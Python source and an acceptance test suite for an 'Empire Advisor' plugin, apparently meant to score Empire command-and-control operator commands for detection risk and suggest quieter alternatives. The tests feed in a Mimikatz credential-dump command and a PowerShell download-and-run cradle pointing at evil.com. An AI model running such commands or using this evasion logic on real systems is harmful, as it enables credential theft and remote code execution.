@@ -1,0 +1,585 @@
+=== empire_advisor.py ===
+empire_advisor.py:17:class Rule:
+empire_advisor.py:18:    """Scoring rule for command evaluation"""
+empire_advisor.py:19:    id: str
+empire_advisor.py:20:    name: str
+empire_advisor.py:21:    pattern: str
+empire_advisor.py:22:    rationale: str
+empire_advisor.py:23:    severity: str
+empire_advisor.py:24:    category: str
+empire_advisor.py:25:
+empire_advisor.py:26:    def matches(self, command: str) -> bool:
+empire_advisor.py:27:        """Check if rule pattern matches the command"""
+empire_advisor.py:28:        return bool(re.search(self.pattern, command, re.IGNORECASE))
+empire_advisor.py:32:class Alternative:
+empire_advisor.py:33:    """Alternative command suggestion from knowledge base"""
+empire_advisor.py:34:    rule_id: str
+empire_advisor.py:35:    suggestion: str
+empire_advisor.py:36:    kb_citation: str
+empire_advisor.py:37:    alternative_commands: List[str]
+empire_advisor.py:41:class AdvisoryResult:
+empire_advisor.py:42:    """Result of command evaluation"""
+empire_advisor.py:43:    command: str
+empire_advisor.py:44:    score: int
+empire_advisor.py:45:    risk_level: str
+empire_advisor.py:46:    matched_rules: List[Dict]
+empire_advisor.py:47:    suggestions: List[Dict]
+empire_advisor.py:48:    advisory_state: str  # allow, warn, block
+empire_advisor.py:49:
+empire_advisor.py:50:    def to_dict(self) -> Dict:
+empire_advisor.py:51:        """Convert to dictionary for JSON output"""
+empire_advisor.py:52:        return asdict(self)
+empire_advisor.py:53:
+empire_advisor.py:54:    def to_json(self) -> str:
+empire_advisor.py:55:        """Convert to JSON string"""
+empire_advisor.py:56:        return json.dumps(self.to_dict(), indent=2)
+empire_advisor.py:59:class EmpireAdvisor:
+empire_advisor.py:60:    """Main advisor engine for Empire command scoring and suggestions"""
+empire_advisor.py:61:
+empire_advisor.py:62:    # Severity to score mapping
+empire_advisor.py:63:    SEVERITY_SCORES = {
+empire_advisor.py:64:        'critical': 100,
+empire_advisor.py:65:        'high': 75,
+empire_advisor.py:66:        'medium': 50,
+empire_advisor.py:67:        'low': 25
+empire_advisor.py:68:    }
+empire_advisor.py:69:
+empire_advisor.py:70:    # Risk thresholds
+empire_advisor.py:71:    BLOCK_THRESHOLD = 100
+empire_advisor.py:72:    WARN_THRESHOLD = 50
+empire_advisor.py:73:
+empire_advisor.py:74:    def __init__(self, rules_path: str = "rules.yaml", kb_path: str = "knowledge_base.yaml"):
+empire_advisor.py:75:        """Initialize advisor with rules and knowledge base"""
+empire_advisor.py:76:        self.rules = self._load_rules(rules_path)
+empire_advisor.py:77:        self.alternatives = self._load_alternatives(kb_path)
+empire_advisor.py:78:
+empire_advisor.py:79:    def _load_rules(self, path: str) -> List[Rule]:
+empire_advisor.py:80:        """Load scoring rules from YAML file"""
+empire_advisor.py:81:        rules_file = Path(path)
+empire_advisor.py:82:        if not rules_file.exists():
+empire_advisor.py:83:            raise FileNotFoundError(f"Rules file not found: {path}")
+empire_advisor.py:84:
+empire_advisor.py:85:        with open(rules_file, 'r') as f:
+empire_advisor.py:86:            data = yaml.safe_load(f)
+empire_advisor.py:87:
+empire_advisor.py:88:        rules = []
+empire_advisor.py:89:        for rule_data in data.get('rules', []):
+empire_advisor.py:90:            rules.append(Rule(**rule_data))
+empire_advisor.py:91:
+empire_advisor.py:92:        return rules
+empire_advisor.py:93:
+empire_advisor.py:94:    def _load_alternatives(self, path: str) -> Dict[str, Alternative]:
+empire_advisor.py:95:        """Load alternative suggestions from YAML file"""
+empire_advisor.py:96:        kb_file = Path(path)
+empire_advisor.py:97:        if not kb_file.exists():
+empire_advisor.py:98:            raise FileNotFoundError(f"Knowledge base file not found: {path}")
+empire_advisor.py:99:
+empire_advisor.py:100:        with open(kb_file, 'r') as f:
+empire_advisor.py:101:            data = yaml.safe_load(f)
+empire_advisor.py:102:
+empire_advisor.py:103:        alternatives = {}
+empire_advisor.py:104:        for alt_data in data.get('alternatives', []):
+empire_advisor.py:105:            alt = Alternative(**alt_data)
+empire_advisor.py:106:            alternatives[alt.rule_id] = alt
+empire_advisor.py:107:
+empire_advisor.py:108:        return alternatives
+empire_advisor.py:109:
+empire_advisor.py:110:    def evaluate_command(self, command: str) -> AdvisoryResult:
+empire_advisor.py:111:        """
+empire_advisor.py:112:        Evaluate a command and return advisory result
+empire_advisor.py:113:
+empire_advisor.py:114:        Args:
+empire_advisor.py:115:            command: The operator command to evaluate
+empire_advisor.py:116:
+empire_advisor.py:117:        Returns:
+empire_advisor.py:118:            AdvisoryResult with score, matched rules, and suggestions
+empire_advisor.py:119:        """
+empire_advisor.py:120:        matched_rules = []
+empire_advisor.py:121:        total_score = 0
+empire_advisor.py:122:
+empire_advisor.py:123:        # Check each rule
+empire_advisor.py:124:        for rule in self.rules:
+empire_advisor.py:125:            if rule.matches(command):
+empire_advisor.py:126:                score = self.SEVERITY_SCORES.get(rule.severity, 0)
+empire_advisor.py:127:                total_score += score
+empire_advisor.py:128:                matched_rules.append({
+empire_advisor.py:129:                    'id': rule.id,
+empire_advisor.py:130:                    'name': rule.name,
+empire_advisor.py:131:                    'rationale': rule.rationale,
+empire_advisor.py:132:                    'severity': rule.severity,
+empire_advisor.py:133:                    'category': rule.category,
+empire_advisor.py:134:                    'score': score
+empire_advisor.py:135:                })
+empire_advisor.py:136:
+empire_advisor.py:137:        # Determine advisory state
+empire_advisor.py:138:        if total_score >= self.BLOCK_THRESHOLD:
+empire_advisor.py:139:            advisory_state = 'block'
+empire_advisor.py:140:            risk_level = 'critical'
+empire_advisor.py:141:        elif total_score >= self.WARN_THRESHOLD:
+empire_advisor.py:142:            advisory_state = 'warn'
+empire_advisor.py:143:            risk_level = 'high'
+empire_advisor.py:144:        else:
+empire_advisor.py:145:            advisory_state = 'allow'
+empire_advisor.py:146:            risk_level = 'low' if total_score > 0 else 'minimal'
+empire_advisor.py:147:
+empire_advisor.py:148:        # Gather suggestions for matched rules
+empire_advisor.py:149:        suggestions = []
+empire_advisor.py:150:        for match in matched_rules:
+empire_advisor.py:151:            rule_id = match['id']
+empire_advisor.py:152:            if rule_id in self.alternatives:
+empire_advisor.py:153:                alt = self.alternatives[rule_id]
+empire_advisor.py:154:                suggestions.append({
+empire_advisor.py:155:                    'rule_id': rule_id,
+empire_advisor.py:156:                    'suggestion': alt.suggestion,
+empire_advisor.py:157:                    'kb_citation': alt.kb_citation,
+empire_advisor.py:158:                    'alternative_commands': alt.alternative_commands
+empire_advisor.py:159:                })
+empire_advisor.py:160:
+empire_advisor.py:161:        return AdvisoryResult(
+empire_advisor.py:162:            command=command,
+empire_advisor.py:163:            score=total_score,
+empire_advisor.py:164:            risk_level=risk_level,
+empire_advisor.py:165:            matched_rules=matched_rules,
+empire_advisor.py:166:            suggestions=suggestions,
+empire_advisor.py:167:            advisory_state=advisory_state
+empire_advisor.py:168:        )
+empire_advisor.py:169:
+empire_advisor.py:170:    def format_advisory(self, result: AdvisoryResult) -> str:
+empire_advisor.py:171:        """Format advisory result for human-readable output"""
+empire_advisor.py:172:        lines = []
+empire_advisor.py:173:        lines.append("=" * 80)
+empire_advisor.py:174:        lines.append("EMPIRE ADVISOR - Command OPSEC Analysis")
+empire_advisor.py:175:        lines.append("=" * 80)
+empire_advisor.py:176:        lines.append(f"\nCommand: {result.command}")
+empire_advisor.py:177:        lines.append(f"Risk Score: {result.score}/100 ({result.risk_level})")
+empire_advisor.py:178:        lines.append(f"Advisory: {result.advisory_state.upper()}")
+empire_advisor.py:179:
+empire_advisor.py:180:        if result.matched_rules:
+empire_advisor.py:181:            lines.append(f"\n--- Matched Rules ({len(result.matched_rules)}) ---")
+empire_advisor.py:182:            for rule in result.matched_rules:
+empire_advisor.py:183:                lines.append(f"\n[{rule['id']}] {rule['name']} ({rule['severity']})")
+empire_advisor.py:184:                lines.append(f"  Category: {rule['category']}")
+empire_advisor.py:185:                lines.append(f"  Rationale: {rule['rationale']}")
+empire_advisor.py:186:                lines.append(f"  Score: +{rule['score']}")
+empire_advisor.py:187:
+empire_advisor.py:188:        if result.suggestions:
+empire_advisor.py:189:            lines.append(f"\n--- Quieter Alternatives ({len(result.suggestions)}) ---")
+empire_advisor.py:190:            for i, sug in enumerate(result.suggestions, 1):
+empire_advisor.py:191:                lines.append(f"\n{i}. {sug['suggestion']}")
+empire_advisor.py:192:                lines.append(f"   KB Citation: {sug['kb_citation']}")
+empire_advisor.py:193:                if sug['alternative_commands']:
+empire_advisor.py:194:                    lines.append(f"   Commands:")
+empire_advisor.py:195:                    for cmd in sug['alternative_commands']:
+empire_advisor.py:196:                        lines.append(f"     • {cmd}")
+empire_advisor.py:197:        else:
+empire_advisor.py:198:            lines.append("\n--- No alternative suggestions available ---")
+empire_advisor.py:199:
+empire_advisor.py:200:        lines.append("\n" + "=" * 80)
+empire_advisor.py:201:        lines.append("ADVISORY ONLY - Operator approval required for execution")
+empire_advisor.py:202:        lines.append("=" * 80)
+empire_advisor.py:203:
+empire_advisor.py:204:        return "\n".join(lines)
+=== empire_plugin.py ===
+empire_plugin.py:35:class Plugin:
+empire_plugin.py:36:    """Empire plugin class for advisor integration"""
+empire_plugin.py:37:
+empire_plugin.py:38:    def __init__(self, main_menu):
+empire_plugin.py:39:        """
+empire_plugin.py:40:        Initialize plugin with Empire main menu
+empire_plugin.py:41:
+empire_plugin.py:42:        Args:
+empire_plugin.py:43:            main_menu: Empire main menu object (None for standalone mode)
+empire_plugin.py:44:        """
+empire_plugin.py:45:        self.main_menu = main_menu
+empire_plugin.py:46:        self.advisor = None
+empire_plugin.py:47:        self.enabled = False
+empire_plugin.py:48:
+empire_plugin.py:49:    def onLoad(self):
+empire_plugin.py:50:        """Called when plugin is loaded by Empire"""
+empire_plugin.py:51:        try:
+empire_plugin.py:52:            # Initialize advisor with rules from plugin directory
+empire_plugin.py:53:            self.advisor = EmpireAdvisor(
+empire_plugin.py:54:                rules_path='plugins/empire-advisor/rules.yaml',
+empire_plugin.py:55:                kb_path='plugins/empire-advisor/knowledge_base.yaml'
+empire_plugin.py:56:            )
+empire_plugin.py:57:            self.enabled = True
+empire_plugin.py:58:            return True
+empire_plugin.py:59:        except Exception as e:
+empire_plugin.py:60:            print(f"[!] Failed to load Empire Advisor: {e}")
+empire_plugin.py:61:            return False
+empire_plugin.py:62:
+empire_plugin.py:63:    def execute(self, command):
+empire_plugin.py:64:        """
+empire_plugin.py:65:        Execute advisor on a command before Empire processes it
+empire_plugin.py:66:
+empire_plugin.py:67:        This would be called as a pre-execution hook in Empire.
+empire_plugin.py:68:        Returns advisory result without executing the command.
+empire_plugin.py:69:
+empire_plugin.py:70:        Args:
+empire_plugin.py:71:            command: Command string to evaluate
+empire_plugin.py:72:
+empire_plugin.py:73:        Returns:
+empire_plugin.py:74:            dict: Advisory result
+empire_plugin.py:75:        """
+empire_plugin.py:76:        if not self.enabled or not self.advisor:
+empire_plugin.py:77:            return {'error': 'Advisor not initialized'}
+empire_plugin.py:78:
+empire_plugin.py:79:        result = self.advisor.evaluate_command(command)
+empire_plugin.py:80:
+empire_plugin.py:81:        # Display formatted advisory
+empire_plugin.py:82:        print(self.advisor.format_advisory(result))
+empire_plugin.py:83:
+empire_plugin.py:84:        # Return structured result
+empire_plugin.py:85:        return result.to_dict()
+empire_plugin.py:86:
+empire_plugin.py:87:    def register_hooks(self):
+empire_plugin.py:88:        """
+empire_plugin.py:89:        Register Empire command hooks (if Empire supports hooks)
+empire_plugin.py:90:
+empire_plugin.py:91:        This is a placeholder for future Empire hook integration.
+empire_plugin.py:92:        Currently, operator must manually invoke advisor.
+empire_plugin.py:93:        """
+empire_plugin.py:94:        # Empire 4.x doesn't have pre-execution hooks by default
+empire_plugin.py:95:        # This would require Empire core modification or operator workflow integration
+empire_plugin.py:96:        pass
+empire_plugin.py:97:
+empire_plugin.py:98:    def shutdown(self):
+empire_plugin.py:99:        """Called when plugin is unloaded"""
+empire_plugin.py:100:        self.enabled = False
+empire_plugin.py:101:        print("[*] Empire Advisor plugin unloaded")
+empire_plugin.py:105:class StandaloneShim:
+empire_plugin.py:106:    """
+empire_plugin.py:107:    Shim for testing plugin without Empire installation
+empire_plugin.py:108:
+empire_plugin.py:109:    Provides minimal Empire-like interface for acceptance testing.
+empire_plugin.py:110:    """
+empire_plugin.py:111:
+empire_plugin.py:112:    def __init__(self):
+empire_plugin.py:113:        """Initialize shim"""
+empire_plugin.py:114:        self.plugin = Plugin(main_menu=None)
+empire_plugin.py:115:        self.plugin.advisor = EmpireAdvisor()
+empire_plugin.py:116:        self.plugin.enabled = True
+empire_plugin.py:117:
+empire_plugin.py:118:    def execute_command(self, command: str) -> dict:
+empire_plugin.py:119:        """
+empire_plugin.py:120:        Execute command through advisor
+empire_plugin.py:121:
+empire_plugin.py:122:        Args:
+empire_plugin.py:123:            command: Command to evaluate
+empire_plugin.py:124:
+empire_plugin.py:125:        Returns:
+empire_plugin.py:126:            Advisory result as dict
+empire_plugin.py:127:        """
+empire_plugin.py:128:        return self.plugin.execute(command)
+empire_plugin.py:129:
+empire_plugin.py:130:    def batch_evaluate(self, commands: list) -> list:
+empire_plugin.py:131:        """
+empire_plugin.py:132:        Evaluate multiple commands
+empire_plugin.py:133:
+empire_plugin.py:134:        Args:
+empire_plugin.py:135:            commands: List of command strings
+empire_plugin.py:136:
+empire_plugin.py:137:        Returns:
+empire_plugin.py:138:            List of advisory results
+empire_plugin.py:139:        """
+empire_plugin.py:140:        results = []
+empire_plugin.py:141:        for cmd in commands:
+empire_plugin.py:142:            result = self.execute_command(cmd)
+empire_plugin.py:143:            results.append(result)
+empire_plugin.py:144:        return results
+empire_plugin.py:145:
+empire_plugin.py:146:    def save_results(self, results: list, output_path: str):
+empire_plugin.py:147:        """Save results to JSON file"""
+empire_plugin.py:148:        with open(output_path, 'w') as f:
+empire_plugin.py:149:            json.dump(results, f, indent=2)
+=== test_advisor.py ===
+test_advisor.py:15:class TestSuite:
+test_advisor.py:16:    """Test suite for Empire Advisor acceptance criteria"""
+test_advisor.py:17:
+test_advisor.py:18:    def __init__(self):
+test_advisor.py:19:        """Initialize test suite"""
+test_advisor.py:20:        self.advisor = EmpireAdvisor()
+test_advisor.py:21:        self.shim = StandaloneShim()
+test_advisor.py:22:        self.results = []
+test_advisor.py:23:        self.passed = 0
+test_advisor.py:24:        self.failed = 0
+test_advisor.py:25:
+test_advisor.py:26:    def log(self, message: str, status: str = "INFO"):
+test_advisor.py:27:        """Log test message"""
+test_advisor.py:28:        prefix = {
+test_advisor.py:29:            "PASS": "✓",
+test_advisor.py:30:            "FAIL": "✗",
+test_advisor.py:31:            "INFO": "→"
+test_advisor.py:32:        }.get(status, "•")
+test_advisor.py:33:        print(f"{prefix} {message}")
+test_advisor.py:34:
+test_advisor.py:35:    def assert_true(self, condition: bool, test_id: str, description: str):
+test_advisor.py:36:        """Assert condition is true"""
+test_advisor.py:37:        if condition:
+test_advisor.py:38:            self.log(f"{test_id}: {description}", "PASS")
+test_advisor.py:39:            self.passed += 1
+test_advisor.py:40:            self.results.append({"id": test_id, "status": "PASS", "description": description})
+test_advisor.py:41:        else:
+test_advisor.py:42:            self.log(f"{test_id}: {description}", "FAIL")
+test_advisor.py:43:            self.failed += 1
+test_advisor.py:44:            self.results.append({"id": test_id, "status": "FAIL", "description": description})
+test_advisor.py:45:
+test_advisor.py:46:    def test_a1_plugin_loads(self):
+test_advisor.py:47:        """A1: Plugin or shim loads via documented procedure"""
+test_advisor.py:48:        try:
+test_advisor.py:49:            shim = StandaloneShim()
+test_advisor.py:50:            self.assert_true(
+test_advisor.py:51:                shim.plugin.enabled,
+test_advisor.py:52:                "A1",
+test_advisor.py:53:                "Plugin/shim loads successfully"
+test_advisor.py:54:            )
+test_advisor.py:55:        except Exception as e:
+test_advisor.py:56:            self.assert_true(False, "A1", f"Plugin load failed: {e}")
+test_advisor.py:57:
+test_advisor.py:58:    def test_a2_advisory_without_execution(self):
+test_advisor.py:59:        """A2: Submitting fixture command produces advisory without executing"""
+test_advisor.py:60:        test_cmd = "Invoke-Mimikatz -DumpCreds"
+test_advisor.py:61:        result = self.advisor.evaluate_command(test_cmd)
+test_advisor.py:62:
+test_advisor.py:63:        # Verify result structure
+test_advisor.py:64:        has_score = result.score >= 0
+test_advisor.py:65:        has_advisory = result.advisory_state in ['allow', 'warn', 'block']
+test_advisor.py:66:        no_execution = True  # No actual execution happens in evaluate_command
+test_advisor.py:67:
+test_advisor.py:68:        self.assert_true(
+test_advisor.py:69:            has_score and has_advisory and no_execution,
+test_advisor.py:70:            "A2",
+test_advisor.py:71:            "Advisory produced without execution"
+test_advisor.py:72:        )
+test_advisor.py:73:
+test_advisor.py:74:    def test_a3_rules_count(self):
+test_advisor.py:75:        """A3: rules.yaml contains ≥10 rules with id + rationale"""
+test_advisor.py:76:        rule_count = len(self.advisor.rules)
+test_advisor.py:77:        all_have_rationale = all(
+test_advisor.py:78:            rule.id and rule.rationale
+test_advisor.py:79:            for rule in self.advisor.rules
+test_advisor.py:80:        )
+test_advisor.py:81:
+test_advisor.py:82:        self.assert_true(
+test_advisor.py:83:            rule_count >= 10 and all_have_rationale,
+test_advisor.py:84:            "A3",
+test_advisor.py:85:            f"Rules file has {rule_count} rules with id + rationale"
+test_advisor.py:86:        )
+test_advisor.py:87:
+test_advisor.py:88:    def test_a4_determinism(self):
+test_advisor.py:89:        """A4: Same input twice → identical score"""
+test_advisor.py:90:        test_cmd = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')"
+test_advisor.py:91:
+test_advisor.py:92:        result1 = self.advisor.evaluate_command(test_cmd)
+test_advisor.py:93:        result2 = self.advisor.evaluate_command(test_cmd)
+test_advisor.py:94:
+test_advisor.py:95:        identical = (
+test_advisor.py:96:            result1.score == result2.score and
+test_advisor.py:97:            result1.risk_level == result2.risk_level and
+test_advisor.py:98:            len(result1.matched_rules) == len(result2.matched_rules)
+test_advisor.py:99:        )
+test_advisor.py:100:
+test_advisor.py:101:        self.assert_true(
+test_advisor.py:102:            identical,
+test_advisor.py:103:            "A4",
+test_advisor.py:104:            f"Deterministic scoring: {result1.score} == {result2.score}"
+test_advisor.py:105:        )
+test_advisor.py:106:
+test_advisor.py:107:    def test_a5_fixture_triggers_suggestion(self):
+test_advisor.py:108:        """A5: At least one fixture triggers suggestion with KB citation"""
+test_advisor.py:109:        fixture_path = Path("testdata/fixture_commands.txt")
+test_advisor.py:110:        if not fixture_path.exists():
+test_advisor.py:111:            self.assert_true(False, "A5", "Fixture file not found")
+test_advisor.py:112:            return
+test_advisor.py:113:
+test_advisor.py:114:        with open(fixture_path, 'r') as f:
+test_advisor.py:115:            commands = [line.strip() for line in f if line.strip() and not line.startswith('#')]
+test_advisor.py:116:
+test_advisor.py:117:        found_suggestion = False
+test_advisor.py:118:        for cmd in commands:
+test_advisor.py:119:            result = self.advisor.evaluate_command(cmd)
+test_advisor.py:120:            if result.suggestions:
+test_advisor.py:121:                # Verify suggestion has KB citation
+test_advisor.py:122:                for sug in result.suggestions:
+test_advisor.py:123:                    if 'kb_citation' in sug and sug['kb_citation']:
+test_advisor.py:124:                        found_suggestion = True
+test_advisor.py:125:                        self.log(f"  Found suggestion for: {cmd[:50]}...", "INFO")
+test_advisor.py:126:                        break
+test_advisor.py:127:            if found_suggestion:
+test_advisor.py:128:                break
+test_advisor.py:129:
+test_advisor.py:130:        self.assert_true(
+test_advisor.py:131:            found_suggestion,
+test_advisor.py:132:            "A5",
+test_advisor.py:133:            "At least one fixture triggers suggestion with KB citation"
+test_advisor.py:134:        )
+test_advisor.py:135:
+test_advisor.py:136:    def test_a6_offline_fixture_mode(self):
+test_advisor.py:137:        """A6: Offline fixture mode works without live Empire C2"""
+test_advisor.py:138:        fixture_path = Path("testdata/fixture_commands.txt")
+test_advisor.py:139:        if not fixture_path.exists():
+test_advisor.py:140:            self.assert_true(False, "A6", "Fixture file not found")
+test_advisor.py:141:            return
+test_advisor.py:142:
+test_advisor.py:143:        try:
+test_advisor.py:144:            with open(fixture_path, 'r') as f:
+test_advisor.py:145:                commands = [line.strip() for line in f if line.strip() and not line.startswith('#')]
+test_advisor.py:146:
+test_advisor.py:147:            results = self.shim.batch_evaluate(commands)
+test_advisor.py:148:
+test_advisor.py:149:            # Verify results were generated
+test_advisor.py:150:            offline_works = len(results) == len(commands) and all('score' in r for r in results)
+test_advisor.py:151:
+test_advisor.py:152:            self.assert_true(
+test_advisor.py:153:                offline_works,
+test_advisor.py:154:                "A6",
+test_advisor.py:155:                f"Offline mode processed {len(results)} fixture commands"
+test_advisor.py:156:            )
+test_advisor.py:157:        except Exception as e:
+test_advisor.py:158:            self.assert_true(False, "A6", f"Offline mode failed: {e}")
+test_advisor.py:159:
+test_advisor.py:160:    def test_a7_readme_exists(self):
+test_advisor.py:161:        """A7: README documents compatibility or shim limits"""
+test_advisor.py:162:        readme_path = Path("README.md")
+test_advisor.py:163:        exists = readme_path.exists()
+test_advisor.py:164:
+test_advisor.py:165:        if exists:
+test_advisor.py:166:            content = readme_path.read_text()
+test_advisor.py:167:            has_compatibility = 'Empire' in content and ('compatibility' in content.lower() or 'shim' in content.lower())
+test_advisor.py:168:            self.assert_true(
+test_advisor.py:169:                has_compatibility,
+test_advisor.py:170:                "A7",
+test_advisor.py:171:                "README documents Empire compatibility/shim"
+test_advisor.py:172:            )
+test_advisor.py:173:        else:
+test_advisor.py:174:            self.assert_true(False, "A7", "README.md not found")
+test_advisor.py:175:
+test_advisor.py:176:    def test_a8_opsec_card(self):
+test_advisor.py:177:        """A8: OPSEC_CARD.md with Detection Recommendations (≥3 bullets)"""
+test_advisor.py:178:        opsec_path = Path("OPSEC_CARD.md")
+test_advisor.py:179:        if not opsec_path.exists():
+test_advisor.py:180:            self.assert_true(False, "A8", "OPSEC_CARD.md not found")
+test_advisor.py:181:            return
+test_advisor.py:182:
+test_advisor.py:183:        content = opsec_path.read_text()
+test_advisor.py:184:        has_detection_section = 'Detection Recommendation' in content
+test_advisor.py:185:        bullet_count = content.count('\n-') + content.count('\n*')
+test_advisor.py:186:
+test_advisor.py:187:        self.assert_true(
+test_advisor.py:188:            has_detection_section and bullet_count >= 3,
+test_advisor.py:189:            "A8",
+test_advisor.py:190:            f"OPSEC_CARD.md has Detection Recommendations ({bullet_count} bullets)"
+test_advisor.py:191:        )
+test_advisor.py:192:
+test_advisor.py:193:    def test_a9_authorized_use_notice(self):
+test_advisor.py:194:        """A9: Authorized-use notice present"""
+test_advisor.py:195:        auth_path = Path("AUTHORIZED_USE.md")
+test_advisor.py:196:        readme_path = Path("README.md")
+test_advisor.py:197:
+test_advisor.py:198:        has_auth_file = auth_path.exists()
+test_advisor.py:199:        has_notice_in_readme = False
+test_advisor.py:200:
+test_advisor.py:201:        if readme_path.exists():
+test_advisor.py:202:            readme_content = readme_path.read_text()
+test_advisor.py:203:            has_notice_in_readme = 'authorized' in readme_content.lower() and 'use' in readme_content.lower()
+test_advisor.py:204:
+test_advisor.py:205:        self.assert_true(
+test_advisor.py:206:            has_auth_file or has_notice_in_readme,
+test_advisor.py:207:            "A9",
+test_advisor.py:208:            "Authorized-use notice present"
+test_advisor.py:209:        )
+test_advisor.py:210:
+test_advisor.py:211:    def test_m1_rationale_understandable(self):
+test_advisor.py:212:        """M1: Scoring rationale understandable without reading source"""
+test_advisor.py:213:        test_cmd = "Invoke-Mimikatz -DumpCreds"
+test_advisor.py:214:        result = self.advisor.evaluate_command(test_cmd)
+test_advisor.py:215:
+test_advisor.py:216:        has_rationale = all(
+test_advisor.py:217:            'rationale' in rule and len(rule['rationale']) > 20
+test_advisor.py:218:            for rule in result.matched_rules
+test_advisor.py:219:        )
+test_advisor.py:220:
+test_advisor.py:221:        self.assert_true(
+test_advisor.py:222:            has_rationale,
+test_advisor.py:223:            "M1",
+test_advisor.py:224:            "All matched rules have detailed rationales"
+test_advisor.py:225:        )
+test_advisor.py:226:
+test_advisor.py:227:    def test_m2_suggestions_are_alternatives(self):
+test_advisor.py:228:        """M2: Suggestions are alternatives in KB, not vague advice"""
+test_advisor.py:229:        test_cmd = "Invoke-Mimikatz -DumpCreds"
+test_advisor.py:230:        result = self.advisor.evaluate_command(test_cmd)
+test_advisor.py:231:
+test_advisor.py:232:        if result.suggestions:
+test_advisor.py:233:            has_commands = all(
+test_advisor.py:234:                'alternative_commands' in sug and sug['alternative_commands']
+test_advisor.py:235:                for sug in result.suggestions
+test_advisor.py:236:            )
+test_advisor.py:237:            self.assert_true(
+test_advisor.py:238:                has_commands,
+test_advisor.py:239:                "M2",
+test_advisor.py:240:                "Suggestions include concrete alternative commands"
+test_advisor.py:241:            )
+test_advisor.py:242:        else:
+test_advisor.py:243:            # Try another command that should have suggestions
+test_advisor.py:244:            result2 = self.advisor.evaluate_command("IEX (New-Object Net.WebClient).DownloadString('http://x.com/p')")
+test_advisor.py:245:            has_commands = any(
+test_advisor.py:246:                'alternative_commands' in sug and sug['alternative_commands']
+test_advisor.py:247:                for sug in result2.suggestions
+test_advisor.py:248:            )
+test_advisor.py:249:            self.assert_true(
+test_advisor.py:250:                has_commands,
+test_advisor.py:251:                "M2",
+test_advisor.py:252:                "Suggestions include concrete alternative commands"
+test_advisor.py:253:            )
+test_advisor.py:254:
+test_advisor.py:255:    def test_m3_dangerous_rules_warn(self):
+test_advisor.py:256:        """M3: Dangerous rules default to warn/block, not silent"""
+test_advisor.py:257:        dangerous_cmd = "Invoke-Mimikatz -DumpCreds"
+test_advisor.py:258:        result = self.advisor.evaluate_command(dangerous_cmd)
+test_advisor.py:259:
+test_advisor.py:260:        proper_advisory = result.advisory_state in ['warn', 'block']
+test_advisor.py:261:
+test_advisor.py:262:        self.assert_true(
+test_advisor.py:263:            proper_advisory,
+test_advisor.py:264:            "M3",
+test_advisor.py:265:            f"Dangerous command gets '{result.advisory_state}' advisory"
+test_advisor.py:266:        )
+test_advisor.py:267:
+test_advisor.py:268:    def run_all(self):
+test_advisor.py:269:        """Run all tests"""
+test_advisor.py:270:        print("\n" + "=" * 80)
+test_advisor.py:271:        print("Empire Advisor - Acceptance Test Suite")
+test_advisor.py:272:        print("=" * 80 + "\n")
+test_advisor.py:273:
+test_advisor.py:274:        # Acceptance criteria tests
+test_advisor.py:275:        self.log("Running acceptance criteria tests...", "INFO")
+test_advisor.py:276:        self.test_a1_plugin_loads()
+test_advisor.py:277:        self.test_a2_advisory_without_execution()
+test_advisor.py:278:        self.test_a3_rules_count()
+test_advisor.py:279:        self.test_a4_determinism()
+test_advisor.py:280:        self.test_a5_fixture_triggers_suggestion()
+test_advisor.py:281:        self.test_a6_offline_fixture_mode()
+test_advisor.py:282:        self.test_a7_readme_exists()
+test_advisor.py:283:        self.test_a8_opsec_card()
+test_advisor.py:284:        self.test_a9_authorized_use_notice()
+test_advisor.py:285:
+test_advisor.py:286:        # Manual fidelity tests
+test_advisor.py:287:        print()
+test_advisor.py:288:        self.log("Running manual fidelity tests...", "INFO")
+test_advisor.py:289:        self.test_m1_rationale_understandable()
+test_advisor.py:290:        self.test_m2_suggestions_are_alternatives()
+test_advisor.py:291:        self.test_m3_dangerous_rules_warn()
+test_advisor.py:292:
+test_advisor.py:293:        # Summary
+test_advisor.py:294:        print("\n" + "=" * 80)
+test_advisor.py:295:        print(f"Test Summary: {self.passed} passed, {self.failed} failed")
+test_advisor.py:296:        print("=" * 80 + "\n")
+test_advisor.py:297:
+test_advisor.py:298:        # Save results
+test_advisor.py:299:        results_path = Path("testdata/test_results.json")
+test_advisor.py:300:        with open(results_path, 'w') as f:
+test_advisor.py:301:            json.dump(self.results, f, indent=2)
+test_advisor.py:302:        print(f"Results saved to: {results_path}")
+test_advisor.py:303:
+test_advisor.py:304:        return self.failed == 0
